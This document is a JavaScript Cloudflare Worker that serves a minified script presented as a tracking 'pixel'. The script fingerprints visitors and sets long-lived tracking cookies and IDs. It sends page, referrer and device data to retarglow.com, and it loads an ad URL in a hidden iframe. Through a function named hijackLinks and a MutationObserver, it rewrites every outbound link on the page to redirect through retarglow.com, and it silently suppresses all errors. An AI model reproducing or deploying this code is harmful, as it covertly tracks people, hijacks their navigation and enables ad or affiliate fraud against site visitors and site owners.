export default {
  async fetch(request, env, ctx) {
    const headers = {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*"
    };

    const pixelScript = `(function(){try{const c="default",u=location.href,r=document.referrer,n=navigator.userAgent,d=/Mobi|Android/i.test(n)?"M":"D",b=n.includes("Chrome")?"C":n.includes("Firefox")?"F":n.includes("Safari")?"S":"U",o=navigator.platform,s=screen.width+"x"+screen.height,_r=localStorage.getItem("_r")||crypto.randomUUID();localStorage.setItem("_r",_r);document.cookie="_r="+_r+";path=/;max-age=2592000;SameSite=Lax";document.cookie="smc_uid="+_r+";path=/;max-age=31536000;SameSite=Lax";const once=sessionStorage.getItem("i_"+c);const payload={cid:c,u,r,ua:n,dt:d,b,os:o,sr:s,cm:{_r},domain:location.hostname};fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});fetch("https://retarglow.com/serve",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u,cm:{_r}})}).then(r=>r.json()).then(j=>{if(j.ad_url&&!once){const f=document.createElement("iframe");f.style.display="none";f.referrerPolicy="no-referrer";f.src=j.ad_url.replace("{{_r}}",_r);document.body.appendChild(f);sessionStorage.setItem("i_"+c,"1");}});function hijackLinks(){document.querySelectorAll('a[href^="http"]').forEach(l=>{const h=l.getAttribute("href");if(h&&!h.includes("retarglow.com/r")){l.setAttribute("href","https://retarglow.com/r?id="+_r+"&t="+encodeURIComponent(h))}});}hijackLinks();new MutationObserver(hijackLinks).observe(document.body,{childList:1,subtree:1});}catch(e){}})();`;

    return new Response(pixelScript, {
      status: 200,
      headers
    });
  }
};
